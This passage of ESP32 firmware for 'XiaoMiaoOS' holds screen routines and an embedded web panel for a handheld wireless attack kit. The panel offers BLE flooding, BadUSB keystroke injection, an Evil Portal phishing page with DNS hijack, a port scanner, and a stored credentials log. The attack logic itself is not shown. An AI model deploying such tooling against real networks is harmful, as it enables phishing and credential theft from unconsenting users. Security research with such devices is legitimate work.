    tft.setTextColor(C_WHITE, C_BLACK);
    tft.setCursor(120, CONTENT_Y + 30);
    tft.print("0KB");
    
    // ── UL progress bar ──
    tft.setTextColor(C_WHITE, C_BLACK);
    tft.setCursor(8, CONTENT_Y + 42);
    tft.print("UL");
    tft.drawRect(28, CONTENT_Y + 42, 88, 7, C_DGRAY);
    tft.setTextColor(C_WHITE, C_BLACK);
    tft.setCursor(120, CONTENT_Y + 42);
    tft.print("0KB");
    
    // ── Status ──
    tft.setTextColor(C_WHITE, C_BLACK);
    tft.setCursor(8, CONTENT_Y + 56);
    tft.print("Status:");
    tft.setTextColor(C_WHITE, C_BLACK);
    tft.setCursor(52, CONTENT_Y + 56);
    tft.print("IDLE");
    
    // Separator
    tft.drawFastHLine(2, CONTENT_Y + 70, SCR_W - 4, C_DGRAY);
    
    tft.setTextColor(C_YELLOW, C_BLACK);
    cnfont_print(4, SCR_H - 22, "B:返回", C_YELLOW, C_BLACK);

    uint32_t last_tx = 0, last_rx = 0;
    uint32_t last_dl = 0, last_ul = 0;
    uint32_t rate_ms = millis();
    uint32_t last_pps_tx = 0, last_pps_rx = 0;
    
    while (buttons_get_event(BTN_ID_B) != BTN_EVENT_PRESS) {
        if (buttons_is_pressed(BTN_ID_B)) break;
        uint32_t tx = g_packets_sent + g_beacons_sent + g_ble_spam_cnt;
        uint32_t rx = g_traffic_rx;
        uint32_t ms = millis();
        
        if (tx != last_tx) {
            // TX count
            tft.fillRect(28, CONTENT_Y + 18, 48, 7, C_BLACK);
            tft.setTextColor(C_WHITE, C_BLACK);
            tft.setCursor(28, CONTENT_Y + 18);
            tft.print(tx);
            last_tx = tx;
            
            // UL bar
            uint32_t tx_kb = (tx * 26) / 1024;
            uint8_t uw = (tx_kb > 100) ? 86 : (uint8_t)(tx_kb * 86 / 100);
            tft.fillRect(29, CONTENT_Y + 43, 86, 5, C_BLACK);
            if (uw > 0) tft.fillRect(29, CONTENT_Y + 43, uw, 5, C_CYAN);
            if (tx_kb != last_ul) {
                tft.fillRect(120, CONTENT_Y + 42, 28, 7, C_BLACK);
                tft.setTextColor(C_WHITE, C_BLACK);
                tft.setCursor(120, CONTENT_Y + 42);
                tft.print(tx_kb); tft.print("KB");
                last_ul = tx_kb;
            }
        }
        
        if (rx != last_rx) {
            // RX count
            tft.fillRect(100, CONTENT_Y + 18, 48, 7, C_BLACK);
            tft.setTextColor(C_WHITE, C_BLACK);
            tft.setCursor(100, CONTENT_Y + 18);
            tft.print(rx);
            last_rx = rx;
            
            // DL bar
            uint32_t rx_kb = (rx * 100) / 1024;
            uint8_t dw = (rx_kb > 100) ? 86 : (uint8_t)(rx_kb * 86 / 100);
            tft.fillRect(29, CONTENT_Y + 31, 86, 5, C_BLACK);
            if (dw > 0) tft.fillRect(29, CONTENT_Y + 31, dw, 5, C_CYAN);
            if (rx_kb != last_dl) {
                tft.fillRect(120, CONTENT_Y + 30, 28, 7, C_BLACK);
                tft.setTextColor(C_WHITE, C_BLACK);
                tft.setCursor(120, CONTENT_Y + 30);
                tft.print(rx_kb); tft.print("KB");
                last_dl = rx_kb;
            }
        }
        
        // Update status every 500ms
        if (ms - rate_ms >= 500) {
            rate_ms = ms;
            uint32_t pps_tx = tx - last_pps_tx;
            uint32_t pps_rx = rx - last_pps_rx;
            last_pps_tx = tx;
            last_pps_rx = rx;
            
            tft.fillRect(52, CONTENT_Y + 56, 60, 7, C_BLACK);
            tft.setTextColor(C_WHITE, C_BLACK);
            tft.setCursor(52, CONTENT_Y + 56);
            if (pps_tx > 50 || pps_rx > 50) {
                tft.setTextColor(C_YELLOW, C_BLACK);
                tft.print("ACTIVE");
            } else if (pps_tx > 0 || pps_rx > 0) {
                tft.setTextColor(C_WHITE, C_BLACK);
                tft.print("SLOW");
            } else {
                tft.print("IDLE");
            }
        }
        
        delay(100);
    }
    buzzer_click();
}

// ═══════════════ NET: Host Scan ═══════════════
static void net_host_scan() {
    tft_soft_restore();  // Always restore screen first
    if (g_wifi_mode == WM_OFF) {
        WiFi.mode(WIFI_STA);
        WiFi.disconnect();
        g_wifi_mode = WM_STA;
        delay(100);
        tft_soft_restore();
    }
    
    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
    scr_draw_title("主机扫描");

    tft.drawRect(2, CONTENT_Y + 14, SCR_W - 4, 56, C_DGRAY);
    tft.setTextFont(1);
    cnfont_print(8, CONTENT_Y + 18, "请先连接WiFi", C_CYAN, C_BLACK);
    cnfont_print(8, CONTENT_Y + 34, "通过网页扫描", C_CYAN, C_BLACK);
    cnfont_print(8, CONTENT_Y + 50, "A:扫描  B:返回", C_CYAN, C_BLACK);
    
    while (true) {
        if (buttons_get_event(BTN_ID_B) == BTN_EVENT_PRESS) break;
        if (buttons_get_event(BTN_ID_A) == BTN_EVENT_PRESS) {
            tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
            scr_draw_title("主机扫描");
            cnfont_print(4, CONTENT_Y + 16, "扫描中...", C_CYAN, C_BLACK);
            
            IPAddress local = WiFi.localIP();
            if (local.toString() != "0.0.0.0") {
                for (int i = 1; i <= 10 && buttons_get_event(BTN_ID_B) != BTN_EVENT_PRESS; i++) {
                    if (buttons_is_pressed(BTN_ID_B)) break;
                    tft.fillRect(0, CONTENT_Y + 12, SCR_W, 30, C_BLACK);
                    scr_draw_title("主机扫描");
                    tft.setTextColor(C_WHITE, C_BLACK);
                    cnfont_print(4, CONTENT_Y + 16, "目标:", C_WHITE, C_BLACK);
                    tft.setCursor(44, CONTENT_Y + 16);
                    tft.print(local[0]); tft.print(".");
                    tft.print(local[1]); tft.print(".");
                    tft.print(local[2]); tft.print(".");
                    tft.print(i);
                    delay(500);
                }
            }
            tft.setTextColor(C_RED, C_BLACK);
            cnfont_print(4, CONTENT_Y + 40, "B:返回", C_RED, C_BLACK);
            while (buttons_get_event(BTN_ID_B) != BTN_EVENT_PRESS) delay(20);
            break;
        }
        delay(30);
    }
}

// ═══════════════ NET: TCP Probe ═══════════════
static void net_tcp_probe() {
    tft_soft_restore();
    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
    scr_draw_title("TCP探测");

    tft.drawRect(2, CONTENT_Y + 14, SCR_W - 4, 56, C_DGRAY);
    tft.setTextFont(1);
    cnfont_print(8, CONTENT_Y + 18, "TCP端口扫描", C_CYAN, C_BLACK);
    cnfont_print(8, CONTENT_Y + 34, "请先连接WiFi", C_CYAN, C_BLACK);
    cnfont_print(8, CONTENT_Y + 50, "B:返回", C_CYAN, C_BLACK);
    
    while (buttons_get_event(BTN_ID_B) != BTN_EVENT_PRESS) {
        delay(50);
    }
}

// ═══════════════ EXPLOIT LOG ═══════════════
static void exploit_log() {
    sd_init();
    // tft_restore() already called inside sd_init() — no extra restore needed
    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
    scr_draw_title("Logs");
    
    tft.drawRect(2, CONTENT_Y + 14, SCR_W - 4, 60, C_DGRAY);
    tft.setTextFont(1);
    
    if (!sd_ok) {
        tft.setTextColor(C_RED, C_BLACK);
        tft.setCursor(8, CONTENT_Y + 20);
        tft.print("SD not mounted");
    } else {
        tft.setTextColor(C_WHITE, C_BLACK);
        tft.setCursor(8, CONTENT_Y + 20);
        tft.print("Logs & PCAPs");
        tft.setCursor(8, CONTENT_Y + 32);
        tft.print("Dir: /logs, /pcap");
        tft.setCursor(8, CONTENT_Y + 44);
        tft.print("Use WebUI to browse");
        tft.setCursor(8, CONTENT_Y + 56);
        tft.print("Creds: /portal/creds.txt");
    }
    
    scr_draw_bottom("", "B:Back");
    
    while (buttons_get_event(BTN_ID_B) != BTN_EVENT_PRESS) delay(20);
}

// ═══════════════ SYSTEM: SD Files ═══════════════
static void sys_files() {
    sd_init();
    // tft_restore() already called inside sd_init() — no extra restore needed
    tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BLACK);
    scr_draw_title("SD文件");

    if (!sd_ok) {
        cnfont_print(4, CONTENT_Y + 16, "SD未挂载", C_RED, C_BLACK);
    } else {
        File root = SD.open("/");

        tft.drawRect(2, CONTENT_Y + 14, SCR_W - 4, 90, C_DGRAY);
        cnfont_print(8, CONTENT_Y + 16, "SD内容:", C_CYAN, C_BLACK);
        int y = CONTENT_Y + 34;
        
        File f = root.openNextFile();
        int count = 0;
        while (f && count < 8) {
            tft.setTextColor(C_WHITE, C_BLACK);
            tft.setCursor(8, y + 2);
            tft.print(f.isDirectory() ? "[DIR] " : "[FILE]");
            char buf[20];
            scr_clip_text(buf, f.name(), 16);
            tft.print(buf);
            y += 10;
            count++;
            f = root.openNextFile();
        }
    }
    
    scr_draw_bottom("", "B:返回");

    while (buttons_get_event(BTN_ID_B) != BTN_EVENT_PRESS) delay(20);
}

// ═══════════════ SYSTEM: WebUI — Comprehensive Management Panel ═══════════════
// Captive portal auto-redirect fix:
// - Phones probe URLs like /generate_204, /hotspot-detect.html etc.
// - /favicon.ico causes browser infinite redirect loop
// - These must return proper responses, NOT 302 redirect
// - All other unknown paths → 302 to "/" (captive portal behavior)

static const char WEBUI_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
<title>XiaoMiaoOS</title>
<style>
:root {
  --bg: #0a0a0f;
  --surface: #15151d;
  --card: #1a1a26;
  --border: rgba(255,255,255,0.06);
  --green: #00e676;
  --green-dim: #00c853;
  --blue: #448aff;
  --orange: #ff9100;
  --red: #ff5252;
  --purple: #e040fb;
  --cyan: #18ffff;
  --text: #e0e0e0;
  --text2: #888;
  --radius: 12px;
  --sidebar-w: 64px;
}
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Noto Sans SC',sans-serif;background:var(--bg);color:var(--text);display:flex;height:100vh;overflow:hidden}
/* ═══ SIDEBAR ═══ */
#sidebar{width:var(--sidebar-w);background:linear-gradient(180deg,#0d0d18 0%,#0f0f1a 100%);display:flex;flex-direction:column;align-items:center;padding-top:12px;border-right:1px solid var(--border);z-index:10;flex-shrink:0}
#sidebar .logo{width:36px;height:36px;border-radius:10px;background:linear-gradient(135deg,var(--green),#00c853);display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:900;color:#000;margin-bottom:20px;box-shadow:0 0 16px rgba(0,230,118,0.3)}
.nav-item{width:48px;height:48px;border-radius:12px;display:flex;flex-direction:column;align-items:center;justify-content:center;margin-bottom:4px;cursor:pointer;transition:all .2s;color:var(--text2);text-decoration:none;font-size:10px;gap:2px}
.nav-item svg{width:20px;height:20px}
.nav-item:hover{background:var(--card);color:var(--text)}
.nav-item.active{background:rgba(0,230,118,0.12);color:var(--green);box-shadow:inset 0 0 0 1px rgba(0,230,118,0.3)}
.nav-spacer{flex:1}
/* ═══ MAIN ═══ */
#main{flex:1;display:flex;flex-direction:column;overflow:hidden}
/* Header */
#header{background:var(--surface);border-bottom:1px solid var(--border);padding:10px 20px;display:flex;align-items:center;justify-content:space-between;gap:16px;flex-shrink:0}
#header .brand{font-size:16px;font-weight:700;letter-spacing:1px}
#header .brand span{color:var(--green)}
.metrics{display:flex;gap:20px;font-size:11px;color:var(--text2)}
.metrics b{color:var(--text);font-size:12px}
.metrics .dot{width:6px;height:6px;border-radius:50%;display:inline-block;margin-right:4px}
.metrics .dot.green{background:var(--green);box-shadow:0 0 6px var(--green)}
.metrics .dot.blue{background:var(--blue);box-shadow:0 0 6px var(--blue)}
/* Content area */
#content{flex:1;overflow-y:auto;padding:16px;scroll-behavior:smooth}
#content::-webkit-scrollbar{width:4px}
#content::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}
/* Pages */
.page{display:none}
.page.active{display:block;animation:fadeIn .3s}
@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
/* Cards */
.card-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:12px}
.card{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:16px;transition:all .2s;position:relative;overflow:hidden}
.card:hover{border-color:rgba(255,255,255,0.12)}
.card.accent-green{border-left:3px solid var(--green)}
.card.accent-blue{border-left:3px solid var(--blue)}
.card.accent-orange{border-left:3px solid var(--orange)}
.card.accent-red{border-left:3px solid var(--red)}
.card.accent-purple{border-left:3px solid var(--purple)}
.card.accent-cyan{border-left:3px solid var(--cyan)}
.card.glow{box-shadow:0 0 20px rgba(0,230,118,0.08),0 0 0 1px rgba(0,230,118,0.15)}
.card h2{font-size:14px;font-weight:600;margin-bottom:10px;display:flex;align-items:center;gap:8px}
.card h2 .dot{width:8px;height:8px;border-radius:50%;background:var(--green)}
.card h2 .dot.blue{background:var(--blue)}
.card h2 .dot.orange{background:var(--orange)}
.card h2 .dot.red{background:var(--red)}
.card h2 .dot.purple{background:var(--purple)}
.card h2 .dot.cyan{background:var(--cyan)}
/* Labels */
.stat-row{display:flex;justify-content:space-between;padding:5px 0;border-bottom:1px solid rgba(255,255,255,0.04);font-size:12px}
.stat-row .l{color:var(--text2)}
.stat-row .v{color:var(--text);font-weight:500}
/* Status pill */
.pill{display:inline-flex;align-items:center;gap:5px;padding:3px 10px;border-radius:20px;font-size:10px;font-weight:600;border:1px solid}
.pill.green{color:var(--green);border-color:rgba(0,230,118,0.3);background:rgba(0,230,118,0.06)}
.pill.blue{color:var(--blue);border-color:rgba(68,138,255,0.3);background:rgba(68,138,255,0.06)}
.pill.red{color:var(--red);border-color:rgba(255,82,82,0.3);background:rgba(255,82,82,0.06)}
/* Buttons */
.btn{display:inline-flex;align-items:center;justify-content:center;gap:6px;padding:8px 16px;border-radius:8px;font-size:12px;font-weight:600;cursor:pointer;border:none;transition:all .2s;text-decoration:none;color:#000}
.btn.green{background:linear-gradient(135deg,var(--green),var(--green-dim));color:#000;box-shadow:0 0 12px rgba(0,230,118,0.2)}
.btn.green:hover{box-shadow:0 0 20px rgba(0,230,118,0.4);transform:translateY(-1px)}
.btn.blue{background:var(--blue);color:#fff}
.btn.orange{background:var(--orange);color:#000}
.btn.red{background:var(--red);color:#fff}
.btn.purple{background:var(--purple);color:#fff}
.btn.cyan{background:var(--cyan);color:#000}
.btn.outline{background:transparent;border:1px solid var(--border);color:var(--text)}
.btn.outline:hover{background:var(--card);border-color:rgba(255,255,255,0.2)}
.btn.sm{padding:5px 10px;font-size:10px}
.btn-group{display:flex;gap:6px;flex-wrap:wrap;margin-top:8px}
/* Inputs */
input,select{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:8px 10px;color:var(--text);font-size:12px;width:100%;outline:none}
input:focus,select:focus{border-color:var(--green);box-shadow:0 0 0 2px rgba(0,230,118,0.1)}
input::placeholder{color:#555}
/* Scan list */
.scan-list{max-height:200px;overflow-y:auto;font-size:11px;font-family:'SF Mono','Fira Code',monospace}
.scan-row{display:flex;justify-content:space-between;padding:3px 0;border-bottom:1px solid rgba(255,255,255,0.03)}
.scan-row .ssid{color:var(--cyan);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:60%}
.scan-row .rssi{color:var(--text2)}
.scan-row .ch{color:var(--text2);font-size:10px}
/* File rows */
.file-row{display:flex;align-items:center;justify-content:space-between;padding:5px 8px;border-radius:6px;font-size:12px;cursor:pointer}
.file-row:hover{background:rgba(255,255,255,0.03)}
.file-row .name{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.file-row .size{color:var(--text2);font-size:10px;margin:0 8px}
/* Toast */
#toast{position:fixed;top:16px;left:50%;transform:translateX(-50%);background:var(--green);color:#000;padding:8px 20px;border-radius:20px;font-size:12px;font-weight:600;z-index:99;opacity:0;transition:opacity .3s;pointer-events:none}
#toast.show{opacity:1}
/* Progress */
.progress{height:4px;background:var(--surface);border-radius:2px;margin:8px 0;overflow:hidden}
.progress .bar{height:100%;background:linear-gradient(90deg,var(--green),var(--cyan));border-radius:2px;transition:width .3s;width:0%}
/* Responsive */
@media(max-width:600px){
  #sidebar{width:48px}
  .nav-item{width:40px;height:40px;font-size:9px}
  .nav-item svg{width:16px;height:16px}
  .card-grid{grid-template-columns:1fr}
  .metrics{gap:10px;font-size:10px}
  #header{padding:8px 12px}
  #content{padding:10px}
}
</style>
</head>
<body>

<!-- ═══ SIDEBAR ═══ -->
<nav id="sidebar">
  <div class="logo">X</div>
  <a class="nav-item active" data-page="dash" onclick="navTo('dash')">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/></svg>
    <span>仪表</span>
  </a>
  <a class="nav-item" data-page="net" onclick="navTo('net')">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="18" r="2"/><path d="M7 14a6 6 0 0 1 10 0"/><path d="M4.5 10a10 10 0 0 1 15 0"/></svg>
    <span>网络</span>
  </a>
  <a class="nav-item" data-page="atk" onclick="navTo('atk')">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2l3 7h7l-5.5 4 2 7L12 16l-6.5 4 2-7L2 9h7z"/></svg>
    <span>攻击</span>
  </a>
  <a class="nav-item" data-page="files" onclick="navTo('files')">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
    <span>文件</span>
  </a>
  <a class="nav-item" data-page="update" onclick="navTo('update')">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
    <span>更新</span>
  </a>
  <div class="nav-spacer"></div>
  <a class="nav-item" data-page="about" onclick="navTo('about')">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
    <span>关于</span>
  </a>
</nav>

<!-- ═══ MAIN ═══ -->
<div id="main">
  <header id="header">
    <div class="brand">XIAO<span>MIAO</span>OS</div>
    <div class="metrics">
      <span><span class="dot green"></span>RAM <b id="h-ram">--</b></span>
      <span><span class="dot blue"></span>Flash <b id="h-flash">--</b></span>
      <span id="h-wifi" style="display:none"><span class="dot green"></span>WiFi <b id="h-ssid">--</b></span>
    </div>
  </header>
  <div id="content">
    <div id="toast"></div>

<!-- ═══════════════ DASHBOARD ═══════════════ -->
<div class="page active" id="page-dash">
<div class="card-grid">
  <div class="card accent-green glow">
    <h2><span class="dot"></span>系统状态</h2>
    <div class="stat-row"><span class="l">固件版本</span><span class="v" id="dash-ver">--</span></div>
    <div class="stat-row"><span class="l">代号</span><span class="v" id="dash-code">--</span></div>
    <div class="stat-row"><span class="l">运行时间</span><span class="v" id="dash-uptime">--</span></div>
    <div class="stat-row"><span class="l">芯片型号</span><span class="v" id="dash-chip">ESP32</span></div>
    <div style="margin-top:8px"><span class="pill green" id="dash-status">● 运行中</span></div>
  </div>
  <div class="card accent-blue">
    <h2><span class="dot blue"></span>内存</h2>
    <div class="stat-row"><span class="l">总 RAM</span><span class="v" id="dash-tram">--</span></div>
    <div class="stat-row"><span class="l">空闲 RAM</span><span class="v" id="dash-fram">--</span></div>
    <div class="stat-row"><span class="l">PSRAM</span><span class="v" id="dash-psram">--</span></div>
    <div class="progress"><div class="bar" id="dash-ram-bar"></div></div>
    <div style="font-size:10px;color:var(--text2)">使用率 <span id="dash-ram-pct">--</span></div>
  </div>
  <div class="card accent-cyan">
    <h2><span class="dot cyan"></span>存储</h2>
    <div class="stat-row"><span class="l">Flash 固件</span><span class="v" id="dash-fwsize">--</span></div>
    <div class="stat-row"><span class="l">SD 卡</span><span class="v" id="dash-sd">--</span></div>
    <div class="stat-row"><span class="l">SD 容量</span><span class="v" id="dash-sdsize">--</span></div>
    <div class="progress"><div class="bar" id="dash-flash-bar" style="width:69%"></div></div>
    <div style="font-size:10px;color:var(--text2)">Flash 使用率 <span id="dash-flash-pct">69%</span></div>
  </div>
  <div class="card accent-purple">
    <h2><span class="dot purple"></span>网络</h2>
    <div class="stat-row"><span class="l">WiFi 模式</span><span class="v" id="dash-wmode">--</span></div>
    <div class="stat-row"><span class="l">IP 地址</span><span class="v" id="dash-ip">--</span></div>
    <div class="stat-row"><span class="l">MAC</span><span class="v" id="dash-mac">--</span></div>
    <div class="stat-row"><span class="l">信号强度</span><span class="v" id="dash-rssi">--</span></div>
  </div>
</div>
<div class="card-grid" style="margin-top:12px">
  <div class="card accent-orange">
    <h2><span class="dot orange"></span>快捷操作</h2>
    <div class="btn-group">
      <button class="btn orange sm" onclick="navTo('net')">⚡ WiFi 扫描</button>
      <button class="btn red sm" onclick="navTo('atk')">⚔ 攻击工具</button>
      <button class="btn purple sm" onclick="navTo('update')">⬆ 检查更新</button>
      <button class="btn cyan sm" onclick="navTo('files')">📁 文件管理</button>
    </div>
  </div>
</div>
</div>

<!-- ═══════════════ NETWORK ═══════════════ -->
<div class="page" id="page-net">
<div class="card-grid">
  <div class="card accent-blue">
    <h2><span class="dot blue"></span>WiFi 信息</h2>
    <div class="stat-row"><span class="l">模式</span><span class="v" id="net-mode">--</span></div>
    <div class="stat-row"><span class="l">SSID</span><span class="v" id="net-ssid">--</span></div>
    <div class="stat-row"><span class="l">IP</span><span class="v" id="net-ip">--</span></div>
    <div class="stat-row"><span class="l">MAC</span><span class="v" id="net-mac">--</span></div>
    <div class="btn-group">
      <button class="btn blue sm" onclick="wifiScan()">📡 扫描</button>
      <button class="btn outline sm" onclick="wifiDisconnect()">断开</button>
    </div>
  </div>
  <div class="card accent-blue">
    <h2><span class="dot blue"></span>WiFi 扫描结果</h2>
    <div class="scan-list" id="wifi-list"><div style="color:#444;text-align:center;padding:20px">按「扫描」开始</div></div>
  </div>
  <div class="card accent-cyan">
    <h2><span class="dot cyan"></span>端口扫描器</h2>
    <div style="display:flex;gap:6px;margin-bottom:8px">
      <input type="text" id="ps-ip" placeholder="IP 地址" style="flex:2">
      <input type="text" id="ps-start" placeholder="起始" style="flex:1" value="1">
      <input type="text" id="ps-end" placeholder="结束" style="flex:1" value="1024">
    </div>
    <button class="btn cyan sm" onclick="portScan()" style="width:100%">🔍 扫描端口</button>
    <div class="scan-list" id="ps-result" style="margin-top:8px;color:var(--cyan)"></div>
  </div>
  <div class="card accent-blue">
    <h2><span class="dot blue"></span>连接 WiFi</h2>
    <input type="text" id="conn-ssid" placeholder="SSID" style="margin-bottom:6px">
    <input type="password" id="conn-pass" placeholder="密码" style="margin-bottom:8px">
    <button class="btn blue sm" onclick="wifiConnect()" style="width:100%">🔗 连接</button>
  </div>
</div>
</div>

<!-- ═══════════════ ATTACK ═══════════════ -->
<div class="page" id="page-atk">
<div class="card-grid">
  <div class="card accent-red">
    <h2><span class="dot red"></span>BLE 攻击</h2>
    <p style="font-size:11px;color:var(--text2);margin-bottom:8px">蓝牙低功耗设备泛洪攻击</p>
    <div class="btn-group">
      <button class="btn red sm" id="btn-ble-start" onclick="atkAction('ble','start')">▶ 启动</button>
      <button class="btn outline sm" id="btn-ble-stop" onclick="atkAction('ble','stop')" style="display:none">⏹ 停止</button>
    </div>
  </div>
  <div class="card accent-orange">
    <h2><span class="dot orange"></span>BadUSB</h2>
    <p style="font-size:11px;color:var(--text2);margin-bottom:8px">BLE HID 键盘注入攻击</p>
    <div class="btn-group">
      <button class="btn orange sm" id="btn-badusb-start" onclick="atkAction('badusb','start')">▶ 启动</button>
      <button class="btn outline sm" id="btn-badusb-stop" onclick="atkAction('badusb','stop')" style="display:none">⏹ 停止</button>
    </div>
    <div style="margin-top:8px">
      <input type="text" id="badusb-script" placeholder="BadUSB 脚本 (如: GUI r,DELAY:500,STRING:notepad,ENTER)" style="font-size:10px">
      <button class="btn outline sm" onclick="saveBadusb()" style="margin-top:4px">💾 保存脚本</button>
    </div>
  </div>
  <div class="card accent-purple">
    <h2><span class="dot purple"></span>Evil Portal</h2>
    <p style="font-size:11px;color:var(--text2);margin-bottom:8px">WiFi 钓鱼门户 + DNS 劫持</p>
    <div class="btn-group">
      <button class="btn purple sm" id="btn-portal-start" onclick="atkAction('portal','start')">▶ 启动</button>
      <button class="btn outline sm" id="btn-portal-stop" onclick="atkAction('portal','stop')" style="display:none">⏹ 停止</button>
    </div>
  </div>
  <div class="card accent-green">
    <h2><span class="dot"></span>Defense</h2>
    <p style="font-size:11px;color:var(--text2);margin-bottom:8px">停止所有攻击，恢复 WiFi 服务</p>
    <div class="btn-group">
      <button class="btn green sm" id="btn-def-start" onclick="atkAction('defense','start')">🛡 防御</button>
    </div>
  </div>
</div>
</div>

<!-- ═══════════════ FILES ═══════════════ -->
<div class="page" id="page-files">
<div class="card-grid">
  <div class="card accent-cyan" style="grid-column:1/-1">
    <h2><span class="dot cyan"></span>SD 卡文件管理</h2>
    <div class="btn-group" style="margin-bottom:8px">
      <button class="btn cyan sm" onclick="fileList()">🔄 刷新</button>
      <label class="btn outline sm" style="cursor:pointer">📤 上传<input type="file" id="file-upload" accept="*" onchange="fileUpload(this)" style="display:none"></label>
      <button class="btn outline sm" onclick="fileList('/')">🏠 根目录</button>
    </div>
    <div id="file-path" style="font-size:10px;color:var(--cyan);margin-bottom:6px">/</div>
    <div id="file-list"><div style="color:#444;text-align:center;padding:20px">加载中...</div></div>
  </div>
</div>
</div>

<!-- ═══════════════ UPDATE ═══════════════ -->
<div class="page" id="page-update">
<div class="card-grid">
  <div class="card accent-green glow">
    <h2><span class="dot"></span>固件更新</h2>
    <div class="stat-row"><span class="l">当前版本</span><span class="v" id="upd-current">--</span></div>
    <div class="stat-row"><span class="l">最新版本</span><span class="v" id="upd-latest">检查中...</span></div>
    <div class="stat-row"><span class="l">发布日期</span><span class="v" id="upd-date">--</span></div>
    <div class="stat-row"><span class="l">固件大小</span><span class="v" id="upd-size">--</span></div>
    <div class="stat-row"><span class="l">更新 URL</span><span class="v" id="upd-url" style="font-size:10px;word-break:break-all">--</span></div>
    <div class="btn-group">
      <button class="btn green sm" onclick="checkUpdate()">🔍 检查更新</button>
      <button class="btn outline sm" onclick="doUpdate()">⬇ 下载更新</button>
    </div>
  </div>
  <div class="card accent-purple">
    <h2><span class="dot purple"></span>更新中心配置</h2>
    <input type="text" id="upd-url-input" placeholder="version.json 地址" style="margin-bottom:8px">
    <button class="btn purple sm" onclick="saveUpdateUrl()" style="width:100%">💾 保存</button>
  </div>
  <div class="card accent-cyan">
    <h2><span class="dot cyan"></span>OTA 上传</h2>
    <p style="font-size:11px;color:var(--text2);margin-bottom:8px">直接上传 .bin 固件刷写</p>
    <label class="btn cyan sm" style="cursor:pointer;width:100%">📤 选择固件文件<input type="file" id="ota-file" accept=".bin" onchange="otaUpload(this)" style="display:none"></label>
    <div class="progress" style="margin-top:8px"><div class="bar" id="ota-bar"></div></div>
    <div id="ota-status" style="font-size:10px;color:var(--text2);margin-top:4px"></div>
  </div>
</div>
</div>

<!-- ═══════════════ ABOUT ═══════════════ -->
<div class="page" id="page-about">
<div class="card-grid">
  <div class="card accent-green glow">
    <h2><span class="dot"></span>XiaoMiaoOS</h2>
    <div class="stat-row"><span class="l">版本</span><span class="v" id="abt-ver">--</span></div>
    <div class="stat-row"><span class="l">代号</span><span class="v" id="abt-code">--</span></div>
    <div class="stat-row"><span class="l">作者</span><span class="v">XiaoMiao</span></div>
    <div class="stat-row"><span class="l">平台</span><span class="v">ESP32</span></div>
    <div class="stat-row"><span class="l">框架</span><span class="v">Arduino + NimBLE</span></div>
    <div class="stat-row"><span class="l">WebUI</span><span class="v">v2.1.1 Neo</span></div>
  </div>
  <div class="card accent-purple">
    <h2><span class="dot purple"></span>功能列表</h2>
    <div style="font-size:11px;color:var(--text2);line-height:1.8">
      <div>● WiFi 扫描 & 攻击工具集</div>
      <div>● BLE 泛洪 & BadUSB 键盘注入</div>
      <div>● Evil Portal 钓鱼门户</div>
      <div>● TCP 端口扫描器</div>
      <div>● Telnet 远程终端</div>
      <div>● SD 卡文件管理</div>
      <div>● NTP 时间同步</div>
      <div>● OTA 固件更新</div>
    </div>
  </div>
</div>
</div>

  </div>
</div>

<script>
// ═══ NAVIGATION ═══
function navTo(page){
  document.querySelectorAll('.nav-item').forEach(function(n){n.classList.remove('active')});
  document.querySelector('[data-page="'+page+'"]').classList.add('active');
  document.querySelectorAll('.page').forEach(function(p){p.classList.remove('active')});
  var el=document.getElementById('page-'+page);
  if(el)el.classList.add('active');
  if(page==='files')fileList();
  if(page==='dash')refreshDash();
  if(page==='net')refreshDash();
  if(page==='update'){refreshDash();checkUpdate();}
  if(page==='about')refreshDash();
}
// ═══ TOAST ═══
function toast(m){var t=document.getElementById('toast');t.textContent=m;t.classList.add('show');setTimeout(function(){t.classList.remove('show')},2000)}
// ═══ DASHBOARD ═══
function refreshDash(){
  fetch('/api/sysinfo').then(function(r){return r.json()}).then(function(d){
    document.getElementById('dash-ver').textContent=d.version||'--';
    document.getElementById('dash-code').textContent=d.codename||'--';
    document.getElementById('dash-uptime').textContent=d.uptime||'--';
    document.getElementById('dash-chip').textContent=d.chip||'ESP32';
    document.getElementById('dash-tram').textContent=(d.totalRam||'--')+' KB';
    document.getElementById('dash-fram').textContent=(d.freeRam||'--')+' KB';
    document.getElementById('dash-psram').textContent=(d.psram||'--')+' KB';
